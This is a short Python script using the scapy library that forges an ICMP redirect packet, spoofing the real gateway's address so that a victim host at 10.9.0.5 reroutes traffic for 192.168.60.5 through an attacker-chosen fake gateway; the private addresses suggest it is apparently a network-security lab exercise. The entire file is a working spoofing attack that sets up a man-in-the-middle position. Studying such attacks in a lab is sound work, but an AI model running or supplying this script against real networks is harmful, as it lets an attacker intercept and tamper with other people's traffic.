#!/usr/bin/env python3

from scapy.all import *  

victim = '10.9.0.5'
real_gateway = '10.9.0.11'
fake_gateway = '10.9.0.111'
  
ip = IP(src = real_gateway,  dst = victim)  
icmp = ICMP(type=5, code=1) # path redirect msg.  
icmp.gw = fake_gateway

ip2 = IP(src = victim, dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());

